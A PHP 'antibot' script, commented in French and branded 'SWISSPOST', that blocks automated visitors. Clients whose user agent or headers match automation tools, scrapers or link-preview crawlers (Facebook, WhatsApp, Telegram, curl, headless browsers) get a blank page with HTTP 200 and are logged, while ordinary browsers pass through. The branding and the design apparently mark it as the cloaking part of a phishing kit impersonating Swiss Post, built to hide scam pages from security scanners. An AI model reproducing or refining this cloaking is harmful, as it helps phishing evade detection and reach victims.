<?php
/**
 * SYSTÈME ANTIBOT AVANCÉ - SWISSPOST
 * Basé sur le système ab.php avec détection sophistiquée
 */

// Éviter les vérifications multiples
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

/**
 * Récupérer l'IP réelle
 */
function getUserIP(): string {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', (string)$_SERVER[$key]);
            return trim(reset($ipList));
        }
    }
    return 'UNKNOWN';
}

/**
 * Vérifier si bot via User-Agent
 */
function isBotUserAgent(): bool {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

    // 1. Vérification stricte des User-Agents vides ou suspects
    if (empty($userAgent) || $userAgent === '-' || $userAgent === 'unknown') {
        return true;
    }

    // 2. Vérification de la longueur (trop court = suspect)
    if (strlen($userAgent) < 10) {
        return true;
    }

    // 3. Bots sophistiqués (AVANT les navigateurs légitimes)
    $sophisticatedBots = [
        '/\(selenium\)/i', '/\(puppeteer\)/i', '/\(playwright\)/i',
        '/\(headless\)/i', '/\(phantomjs\)/i', '/\(mechanize\)/i',
        '/\(scrapy\)/i', '/\(requests\)/i', '/\(httpclient\)/i',
        '/\(axios\)/i', '/\(fetch\)/i', '/\(restsharp\)/i',
        '/selenium/i', '/puppeteer/i', '/playwright/i',
        '/headless/i', '/phantomjs/i', '/mechanize/i',
        '/scrapy/i', '/requests/i', '/httpclient/i',
        '/axios/i', '/fetch/i', '/restsharp/i'
    ];

    foreach ($sophisticatedBots as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }

    // 4. Navigateurs légitimes connus (APRÈS vérification bots)
    $legitimateBrowsers = [
        '/mozilla\/5\.0.*chrome\/\d+\.\d+.*safari\/\d+\.\d+/i',
        '/mozilla\/5\.0.*chrome\/\d+\.\d+.*edg\/\d+\.\d+/i',
        '/mozilla\/5\.0.*firefox\/\d+\.\d+/i',
        '/mozilla\/5\.0.*gecko\/\d+.*firefox\/\d+\.\d+/i',
        '/mozilla\/5\.0.*safari\/\d+\.\d+.*version\/\d+\.\d+/i',
        '/mozilla\/5\.0.*macintosh.*safari\/\d+\.\d+/i',
        '/mozilla\/5\.0.*windows.*edg\/\d+\.\d+/i',
        '/mozilla\/5\.0.*opera\/\d+\.\d+/i',
        '/mozilla\/5\.0.*opr\/\d+\.\d+/i',
        '/mozilla\/5\.0.*mobile.*safari\/\d+\.\d+/i',
        '/mozilla\/5\.0.*android.*chrome\/\d+\.\d+/i',
        '/mozilla\/5\.0.*iphone.*safari\/\d+\.\d+/i'
    ];

    $isLegitimateBrowser = false;
    foreach ($legitimateBrowsers as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            $isLegitimateBrowser = true;
            break;
        }
    }

    // 5. Vérification des headers pour les navigateurs légitimes
    if ($isLegitimateBrowser) {
        $essentialHeaders = [
            'HTTP_ACCEPT',
            'HTTP_ACCEPT_LANGUAGE',
            'HTTP_ACCEPT_ENCODING'
        ];

        $missingHeaders = 0;
        foreach ($essentialHeaders as $header) {
            if (empty($_SERVER[$header])) {
                $missingHeaders++;
            }
        }

        // Si plus de 2 headers manquent, c'est suspect même pour un navigateur
        if ($missingHeaders >= 2) {
            return true;
        }

        return false; // C'est un vrai navigateur
    }

    // 6. Patterns de bots communs
    $commonBots = [
        'bot', 'crawl', 'spider', 'scrape', 'slurp', 'facebook',
        'whatsapp', 'telegram', 'curl', 'wget', 'python',
        'java', 'http', 'libwww', 'perl', 'php', 'ruby',
        'go-http', 'okhttp', 'aiohttp'
    ];

    $lowerUA = strtolower($userAgent);
    foreach ($commonBots as $botPattern) {
        if (strpos($lowerUA, $botPattern) !== false) {
            return true;
        }
    }

    return false;
}

/**
 * Logger bot bloqué
 */
function logBotBlocked(string $ip, string $reason): void {
    $logFile = __DIR__ . '/logs/bot-blocked-' . date('Y-m-d') . '.log';
    $timestamp = date('Y-m-d H:i:s');
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'empty';
    $log = sprintf("[%s] IP: %s | Reason: %s | UA: %s\n", $timestamp, $ip, $reason, $ua);
    @file_put_contents($logFile, $log, FILE_APPEND | LOCK_EX);
}

/**
 * Afficher page blanche pour les bots
 */
function blockBot(string $reason): void {
    $ip = getUserIP();
    logBotBlocked($ip, $reason);
    http_response_code(200);
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title></title></head><body></body></html>';
    exit();
}

// ==========================================
// EXÉCUTION ANTIBOT
// ==========================================

// Vérifier le cache de session
$ip = getUserIP();
$sessionKey = 'antibot_checked_' . md5($ip);

// Si déjà vérifié et autorisé dans les 30 dernières minutes
if (isset($_SESSION[$sessionKey]) && (time() - $_SESSION[$sessionKey]) < 1800) {
    return; // Autorisé
}

// Vérification User-Agent
if (isBotUserAgent()) {
    blockBot('Bot User-Agent detected');
}

// Marquer comme vérifié et autorisé
$_SESSION[$sessionKey] = time();
